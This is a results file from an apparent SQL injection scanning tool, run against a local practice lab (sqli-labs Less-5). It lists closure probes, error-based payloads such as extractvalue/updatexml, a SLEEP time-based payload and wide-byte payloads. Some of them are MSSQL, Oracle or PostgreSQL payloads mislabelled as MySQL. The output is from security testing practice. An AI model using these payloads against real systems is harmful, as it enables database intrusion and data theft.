@@ -1,0 +1,130 @@
+# 纯Python SQL注入探测结果
+# 时间: 2026-08-18 12:15:58
+# 等级: 2 | WAF: 未检测到WAF
+
+
+============================================================
+[http://127.0.0.1:8080/Less-5/?id=1]
+
+--- 闭合探测 (4条) ---
+  描述: 引号='时触发SQL错误，疑似MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: '
+
+  描述: 引号=')时触发SQL错误，疑似MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: ')
+
+  描述: 引号='))时触发SQL错误，疑似MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: '))
+
+  描述: 引号=\时触发SQL错误，疑似MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: \
+
+
+--- 报错注入 (15条) ---
+  描述: 报错回显确认: MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: ' extractvalue(1,concat(0x7e,database()))-- 
+
+  描述: 报错回显确认: MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: ' updatexml(1,concat(0x7e,database()),1)-- 
+
+  描述: 报错回显确认: MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: ' (select count(*) from information_schema.tables group by c
+
+  描述: 报错回显确认: MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: ' exp(~(select * from(select database())a))-- 
+
+  描述: 报错回显确认: MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: ' geometrycollection((select * from(select database())a))-- 
+
+  描述: 报错回显确认: MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: ' multipoint((select * from(select database())a))-- 
+
+  描述: 报错回显确认: MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: ' polygon((select * from(select database())a))-- 
+
+  描述: 报错回显确认: MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: ' multipolygon((select * from(select database())a))-- 
+
+  描述: 报错回显确认: MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: ' linestring((select * from(select database())a))-- 
+
+  描述: 报错回显确认: MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: ' cast(database() as numeric)-- 
+
+  描述: 报错回显确认: MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: ') '||(select current_database())||'-- 
+
+  描述: 报错回显确认: MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: ' convert(int,db_name())-- 
+
+  描述: 报错回显确认: MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: ' ;select 1 where 1=db_name()---- 
+
+  描述: 报错回显确认: MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: to_char(dbms_xmlgen.getxml('select user from dual'))
+
+  描述: 报错回显确认: MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: ' ctxsys.drithsx.sn(1,(select user from dual))-- 
+
+
+--- 时间盲注 (1条) ---
+  描述: 延迟3.0s (基线0.0s)
+  DBMS: ?
+  编码: 原始
+  Payload: ' AND (SELECT SLEEP(3))-- 
+
+
+--- 宽字节注入 (3条) ---
+  描述: 宽字节触发SQL错误 → MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: %df'
+
+  描述: 宽字节触发SQL错误 → MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: %bf'
+
+  描述: 宽字节触发SQL错误 → MySQL
+  DBMS: MySQL
+  编码: 原始
+  Payload: %aa'
+
